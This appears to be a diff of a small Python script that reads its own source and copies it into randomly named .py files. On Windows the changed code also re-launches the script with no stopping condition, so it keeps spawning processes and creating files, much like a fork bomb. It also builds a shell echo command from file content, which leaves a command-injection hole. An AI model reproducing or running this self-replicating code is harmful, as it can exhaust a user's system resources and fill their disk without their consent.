@@ -8,7 +8,7 @@ def create_random_filename(ext):
 
 
 def reveal(n):
-	print(n)
+	print(n) # Add things above and they will print to console (ascii art, whatever...)
 	return n
 
 def parse(f,d):
@@ -19,12 +19,13 @@ def parse(f,d):
 
 
 def main():
-	if '-lol' in sys.argv:
-		os.system('python %s -lol' % sys.argv[0])
 	name = sys.argv[0]
 	showandtell = lambda s : reveal(s)
 	this = ''.join(parse(name, True))
-	os.system('echo "'+showandtell(this)+ '" >> ' + create_random_filename('.py'))
-
+	if os.name != 'nt':
+		os.system('echo "'+showandtell(this)+ '" >> ' + create_random_filename('.py'))
+	else:
+		open(create_random_filename('.py'),'w').write(showandtell(this))
+		os.system('python %s' % sys.argv[0])
 if __name__ == '__main__':
 	main()
